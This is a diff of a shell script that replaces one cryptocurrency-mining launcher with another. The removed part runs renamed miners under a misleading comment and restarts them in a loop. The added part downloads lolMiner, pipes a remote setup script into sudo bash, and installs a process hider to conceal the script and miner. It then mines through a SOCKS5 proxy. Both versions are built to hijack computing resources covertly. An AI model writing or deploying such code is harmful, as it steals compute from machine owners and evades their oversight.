@@ -1,30 +1,14 @@
-#!/bin/bash xD
-# Verifica se o gedit está sendo executado
-NOMEMAQUINA="$2";
-CARTEIRA="$1"
-./xtreta --donate-level 1 -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA -p x -k -a rx/0 &
-sleep 1;
-./ntreta -a ethash  -log -o 144.217.82.15:80 -u $CARTEIRA.$NOMEMAQUINA &
-
-while true; do
-	sleep 60;
-	clear
-	NOMEMAQUINA="$2";
-	CARTEIRA="$1"
-	if pgrep "xtreta" > /dev/null
-	then
-		echo "Executando - xtreta" $NOMEMAQUINA;
-	else
-		echo "Parado - xtreta";
-		./xtreta --donate-level 1 -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA -p x -k -a rx/0 &
-	fi
-
-	if pgrep "ntreta" > /dev/null
-	then
-		echo "Executando - ntreta" $NOMEMAQUINA;
-	else
-		echo "Parado - ntreta";
-		./ntreta -a ethash  -log -o 144.217.82.15:80 -u $3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$NOMEMAQUINA &
-	fi	
-
-done
+#!/bin/sh
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.39/lolMiner_v1.39_Lin64.tar.gz 
+tar -xf lolMiner_v1.39_Lin64.tar.gz
+cd 1.39
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+ph add cici.sh
+ph add lolMiner
+sleep 14
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user berkah.001-$(echo $(shuf -i 1-99 -n 1)) --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60 
